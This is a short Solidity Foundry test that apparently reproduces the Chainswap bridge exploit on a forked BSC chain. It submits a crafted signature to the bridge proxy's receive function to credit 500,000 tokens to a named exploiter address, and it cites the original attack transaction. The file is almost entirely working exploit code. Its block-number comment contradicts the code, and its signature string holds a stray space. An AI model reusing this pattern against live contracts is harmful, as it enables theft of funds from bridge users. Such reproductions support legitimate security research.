// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";

struct Signature {
    address signatory;
    uint8   v;
    bytes32 r;
    bytes32 s;
}

interface IChainswap {
  function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable;
}

contract ContractTest is DSTest {  
  address exploiter = 0xEda5066780dE29D00dfb54581A707ef6F52D8113;
  address proxy = 0x089165ac9a7Bf61833Da86268F34A01652543466;
  address impl = 0xc5185d2c68aAa7c5f0921948f8135d01510D647F;

  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork("bsc", 9042274); // fork mainnet at block 13125070   
  }

  function testExploit() public {
    // https://bscscan.com/tx/0x83b4adaf73ad34c5c53aa9b805579ed74bc1391c5297201e6457cde709dff723
    Signature[] memory sigs = new Signature[](1);
    sigs[0] = Signature({signatory: 0xF1790Ac4900F761F677107de65CE6Ed65f952A7c, v: 28, r: 0x961afd291dbcec7dc1b0fa28f989f805fe1acdb18fcf2369d434710cde4c03ac, s: 0x39884d4ef7e88e9b70b0135fca3dd2a97e806ead11e38aa6e75f550724962910});
    
    proxy.call(abi.encodeWithSignature("receive(uint256,address,uint256,uint256, Signature[])", 1, exploiter, 0, 500000000000000000000000,  sigs));    
  }

  receive() external payable {}
}
